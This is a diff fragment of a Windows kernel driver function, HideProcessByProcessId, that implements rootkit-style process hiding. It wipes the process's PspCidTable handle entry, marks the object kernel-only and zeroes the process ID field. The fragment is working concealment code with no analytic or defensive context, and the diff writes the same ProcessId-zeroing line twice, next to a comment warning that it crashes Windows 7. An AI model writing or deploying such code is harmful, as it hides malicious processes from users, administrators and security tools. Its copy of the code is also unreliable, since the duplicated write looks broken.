@@ -290,22 +290,18 @@ NTSTATUS HideProcessByProcessId(HANDLE ProcessId)
     KdPrint(("CidTableItem = %p\n", CidTableItem));
 
     KeEnterCriticalRegion();
-
     memset(CidTableItem, 0, 0x10);   //Wipe Handle in PspCidTable
     //SetProtectionStatus(Process);
     *(UCHAR*)((ULONG64)Process - 0x15) = 0x4;   //ObjectHeader.Flags.KernelOnlyAccess = 1
+
     //RemoveEntryList((PLIST_ENTRY)((PUCHAR)Process + ActiveProcessLinksOffset));
     //InitializeListHead((PLIST_ENTRY)((PUCHAR)Process + ActiveProcessLinksOffset));  //SelfConnected
 
+    *(PULONG64)((PUCHAR)Process + ActiveProcessLinksOffset - 8) = 0x0;    //ProcessId 
     //Will trigger BSOD if pid not exist on Win7
-    //*(PULONG64)((PUCHAR)Process + ActiveProcessLinksOffset - 8) = 0x0;    //ProcessId 
-
+    *(PULONG64)((PUCHAR)Process + ActiveProcessLinksOffset - 8) = 0x0;    //ProcessId 
     KeLeaveCriticalRegion();
-
-    return TRUE;
-
     ObDereferenceObject(Process);
-
     return status;
 }
 
